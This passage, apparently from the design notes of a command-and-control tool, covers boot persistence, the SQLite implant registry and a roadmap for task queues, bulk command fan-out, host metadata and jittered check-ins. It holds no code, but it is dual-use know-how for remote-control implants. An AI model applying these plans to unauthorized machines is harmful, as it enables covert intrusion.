would start at boot with no interactive session, which the logon task does not. A service also
needs a genuine `ServiceMain` + `StartServiceCtrlDispatcher` in a `--service` mode; a console
EXE registered as a service fails with error 1053 without it. Both are plainly visible in
Autoruns / Task Manager / the Services console.

### Still not implemented

**Server state is now persisted, but only for implants.** Specifically:

- **Implant records are in SQLite** (`server/data/forzer.db`, `node:sqlite`),
  one shared secret per device. `viewers` and the live socket table are still in
  memory, which is correct — a browser session is not something to restore across
  a redeploy. A control-plane restart no longer forgets which implants exist, which
  is the failure this used to have on every Render redeploy.
- **Still missing from the schema:** `tasks`, `audit`, `listeners`, `caps`, `tags`.
  There is no task queue, so a result that arrives after a reconnect is still lost;
  there is no audit log, so there is no record of who ran what; there is no
  capability negotiation, so every implant can be driven every way. Those are the
  next three pieces of work, in that order.
- **No implant metadata beyond name and timestamps.** No OS, architecture, user,
  domain, hostname or PID is collected at registration, so the operator list cannot
  distinguish two boxes with the same name. The `implants` table has room for the
  columns; nothing writes them yet.
- **No implant-to-implant addressing, and no overlay.** `signal`, `apply_peer()` and
  the peer cache are gone. This is a star around one control plane. There is no path
  for two implants to talk if the control plane disappears.

### The dependency order for finishing it

Step 1 is done. What remains:

1. **Task queue.** A `tasks` table plus a lifecycle
   (`queued → sent → running → completed | failed | expired`), with re-delivery of
   unfinished work on reconnect. Until this exists, a command whose result arrives
   after a dropped socket is lost with no trace, and the operator cannot ask the
   control plane what happened.
2. **Audit log.** Append-only: who, when, which implant, what, result. Cheap once
   `tasks` exists, and it is the artifact that makes a tool which executes arbitrary
   commands defensible.
3. **Tags and capabilities.** Tag-based fan-out (`bulk run <tag> <cmd>`) replaces
   addressing implants one at a time, and per-implant capability flags let the
   control plane refuse to send something an implant should not receive.
4. **Implant metadata.** Fill in the OS / user / hostname / PID columns at
   registration.
5. **Server-driven check-in interval,** which is what `sleep` is a first cut
   of. An operator can now put one box quiet for up to an hour and the agent
   honours it — but it is still something a human has to remember, there is no
   automatic quiet period, no jittered wake schedule, and no way to say "check
   in every 20 minutes ± 5" for a host that is never driven. Making the
   interval server-controlled and persistent belongs here, with the task queue
   underneath it so a command that lands while a box is asleep is delivered on
   wake instead of lost.
